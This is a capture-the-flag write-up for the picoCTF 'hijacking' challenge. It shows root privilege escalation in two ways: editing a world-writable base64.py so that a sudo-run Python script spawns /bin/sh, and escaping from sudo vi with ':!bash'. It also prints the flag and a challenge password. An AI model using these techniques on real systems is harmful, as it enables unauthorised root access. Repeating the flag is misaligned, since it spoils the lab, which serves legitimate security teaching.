# hijacking

Python Library hijacking, Privilege Escalation

## Description of challenge

You are asked to ssh into a shell (as the user *picoctf*) which home directory contains the [`.server.py`](./.server.py) hidden file. 

The flag is in `metadata.json` in the `/challenge` directory which you have no read permissions. 

> Note: Upon reading other writeups, it is revealed that the flag is in `/root/.flag.txt`. This does not affect the exploit, however. 

Also, we see that we are allowed certain sudo permissions

```bash
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

which means that we can
1. run `/usr/bin/vi` as any user, and
2. run the command `sudo /usr/bin/python3 /home/picoctf/.server.py` without requiring a password. 

(1) can be used to obtain the flag, but in the spirit of learning about Python library hijacking, let us instead use (2). 

## Conditions for Exploit

The following conditions give us the ability to hijack the imported Python library for privilege escalation
1. `.server.py` is a file that is run with root privileges, as it is owned by root
2. `/usr/lib/python3.8/base64.py` is a file we have rwx permissions to
3. `.server.py` calls a static method of the imported `base64` module

We find the file in (2) by first dumping the search priority for python3 on the remote host with the command 

```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```

which gives us 

```

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

If we then run `ls -la | grep -E '^.{7}rwx'` in `/usr/lib/python3.8`, we get

```bash
picoctf@challenge:/usr/lib/python3.8$ ls -la | grep -E '^.{7}rwx'
lrwxrwxrwx 1 root root     35 May 26  2023 _sysconfigdata__linux_x86_64-linux-gnu.py -> _sysconfigdata__x86_64-linux-gnu.py
-rwxrwxrwx 1 root root  20382 May 26  2023 base64.py
lrwxrwxrwx 1 root root     31 May 26  2023 sitecustomize.py -> /etc/python3.8/sitecustomize.py
```

which tells that we have rwx permissions for `base64.py`. 

Let us call the Python Library hijacking we are about to perform Method 1. 

## Method 1: Python Library hijacking

Since we have rwx permissions to the imported `base64` module used by `.server.py`, we can modify the method used in `.server.py` to run ./bin/sh for us. 

```python
def b64encode(s, altchars=None):
    """Encode the bytes-like object s using Base64 and return a bytes object blah blah
    """
    os.system("/bin/sh")
    encoded = binascii.b2a_base64(s, newline=False)
    ...
    return encoded
```

The issue, however, is that execution of `.server.py` errors out before `base64.b64encode` is run. 

```bash
picoctf@challenge:~$ sudo python3 /home/picoctf/.server.py
sh: 1: ping: not found
Traceback (most recent call last):
  File "/home/picoctf/.server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip)
socket.gaierror: [Errno -5] No address associated with hostname
```

Since imported modules are basically Python code that is copied and run before the actual script runs, we can instead make the following modification to `/usr/lib/python3.8/base64.py`

```python
# Some author credits, etc

import re
import struct
import binascii
import os

os.system('/bin/sh')
```

Now if we run `sudo python3 /home/picoctf/.server.py`, we are dropped into a shell with root privileges

```
picoctf@challenge:~$ sudo python3 /home/picoctf/.server.py

# ls
# whoami
root
# cat /challenge/metadata.json
{"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_13cfd3cc}", "username": "picoctf", "password": "w26873vTLt"}
```

## Method 2: Privilege Escalation through vi

Recall from the [challenge description](#description-of-challenge) that we can run `/usr/bin/vi` as any user. 

Also note that we can run the following within vi to escape to a shell

```vi
:!bash
```

Method 2 thus simply involves running `/usr/bin/vi` as root using `sudo` and then escaping to a root shell from there to get the flag

```bash
picoctf@challenge:~$ sudo vi
[sudo] password for picoctf: <input the password for user picoctf>

...

root@challenge:/home/picoctf# cd ../../
root@challenge:/# cd challenge
root@challenge:/challenge# ls
metadata.json
root@challenge:/challenge# cat metadata.json
{"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_13cfd3cc}", "username": "picoctf", "password": "w26873vTLt"}
```